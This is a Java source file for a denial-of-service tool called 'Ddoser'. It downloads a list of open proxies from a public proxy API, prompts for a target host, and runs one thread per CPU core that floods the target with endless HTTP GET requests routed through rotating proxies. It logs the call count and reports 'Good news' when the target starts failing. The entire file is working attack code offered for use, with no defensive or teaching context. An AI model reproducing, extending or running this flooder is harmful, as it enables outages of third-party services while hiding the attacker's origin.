import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.ProxySelector;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Queue;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

public class Ddoser {

    final static AtomicLong successfulCalls = new AtomicLong();
    final static int CORES = Runtime.getRuntime().availableProcessors();
    final static Queue<Map.Entry> PROXIES = getProxies();


    static Queue<Map.Entry> getProxies() {
        final HttpClient httpClient = HttpClient.newBuilder()
                .version(HttpClient.Version.HTTP_2)
                .connectTimeout(Duration.ofSeconds(10))
                .build();

        final HttpRequest request = HttpRequest.newBuilder()
                .GET()
                .uri(URI.create("https://api.proxyscrape.com/v2/?request=displayproxies&country=all"))
                .setHeader("User-Agent", "Java 11 HttpClient Bot")
                .build();
        HttpResponse<String> response = null;
        try {
            response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
        } catch (IOException | InterruptedException e) {
            System.out.println("Something went wrong. Try again");
        }

        final ConcurrentLinkedQueue<Map.Entry> clq = new ConcurrentLinkedQueue<>();
        Arrays.stream(response.body().split("\r\n"))
                .map(String::trim)
                .map(s -> {
                    final String[] hostAndPort = s.split(":");
                    return hostAndPort.length == 2 ? Map.entry(String.valueOf(hostAndPort[0]), Integer.valueOf(hostAndPort[1])) : null;
                })
                .filter(Objects::nonNull)
                .forEach(clq::add);

        return clq;
    }

    public static void main(String[] args) throws IOException, InterruptedException {
        final String hostToDdos = getHost().trim();

        final ExecutorService executorService = Executors.newFixedThreadPool(CORES);
        final List<Callable<Integer>> attackTasks = new ArrayList<Callable<Integer>>();

        for (int i = 0; i < CORES; i++) {
            final int threadNum = i + 1;
            Callable<Integer> c = () -> {
                while (true) {
                    try {
                        sendRequests(threadNum, hostToDdos);
                    } catch (IllegalArgumentException e) {
                        if (PROXIES.isEmpty()) {
                            throw new Error("No more proxies. Restart programme");
                        }
                    }
                }
            };
            attackTasks.add(c);
        }

        List<Future<Integer>> results = executorService.invokeAll(attackTasks);
    }

    public static String getHost() throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("Enter Host for attack");

        return br.readLine();
    }

    static void sendRequests(Integer threadNum, String hostToDdos) {
        final Map.Entry<String, Integer> proxie = PROXIES.poll();

        final HttpClient httpClient = HttpClient.newBuilder()
                .version(HttpClient.Version.HTTP_2)
                .proxy(ProxySelector.of(new InetSocketAddress(proxie.getKey(), proxie.getValue())))
                .connectTimeout(Duration.ofSeconds(10))
                .build();

        final HttpRequest request = HttpRequest.newBuilder()
                .GET()
                .uri(URI.create(hostToDdos))
                .setHeader("User-Agent", "Java 11 HttpClient Bot")
                .build();


        final AtomicBoolean isFirstCall = new AtomicBoolean(true);
        final AtomicBoolean isExeption = new AtomicBoolean(false);
        final AtomicBoolean makeNewRequest = new AtomicBoolean(true);

        while (true) {

            if (makeNewRequest.get()) {
                makeNewRequest.set(false);
                httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenApply(resp -> {
                    final long calls = successfulCalls.incrementAndGet();
                    if (calls % 10 == 0) {
                        System.out.println("Ddos calls: " + calls);
                    }
                    if (resp.statusCode() != 200) {
                        System.out.println("Good news. Response status: " + resp.statusCode());
                    }
                    if (isFirstCall.get()) {
                        System.out.printf("Request from thread: %s, proxy: %s response status %s%n",
                                threadNum,
                                String.format("%s:%s", proxie.getKey(), proxie.getValue()),
                                resp.statusCode());
                        isFirstCall.set(false);
                    }
                    makeNewRequest.set(true);
                    return resp;
                }).exceptionally(throwable -> {
                    isExeption.set(true);
                    makeNewRequest.set(true);
                    throw new IllegalArgumentException();
                });

            }

            if (isExeption.get()) {
                throw new IllegalArgumentException();
            }
        }
    }
}
